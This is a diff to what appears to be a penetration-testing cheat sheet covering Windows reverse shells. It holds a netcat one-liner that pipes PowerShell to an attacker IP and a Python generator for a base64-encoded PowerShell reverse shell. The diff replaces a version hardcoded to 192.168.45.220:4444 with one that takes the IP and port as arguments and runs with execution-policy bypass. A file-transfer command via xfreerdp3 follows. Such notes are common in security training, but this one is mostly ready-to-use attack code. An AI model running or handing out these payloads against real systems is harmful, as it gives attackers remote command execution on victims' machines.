@@ -66,15 +66,30 @@ Windows reverse shell
 - `C:\Windows\Temp\nc.exe -e powershell.exe {kali_IP} 4444` Powershell reverse shell
 
 ```
+import base64
 import sys
-    import base64
-    
-    payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.220",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-    
-    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-    
-    print(cmd)
-    
+
+if len(sys.argv) < 3:
+  print('usage : %s ip port' % sys.argv[0])
+  sys.exit(0)
+
+payload="""
+$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
+$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+    $sb = (iex $d 2>&1 | Out-String );
+    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
+    $s.Write($sb,0,$sb.Length);
+    $s.Flush()
+};
+$c.Close()
+""" % (sys.argv[1], sys.argv[2])
+
+byte = payload.encode('utf-16-le')
+b64 = base64.b64encode(byte)
+print("powershell -exec bypass -enc %s" % b64.decode())
+
 ```
 
 Transfer files with xfreerdp3 - `xfreerdp3 /u:{u} /p:{p} /v:{IP} /drive:mydrive,{local_dir_path}`
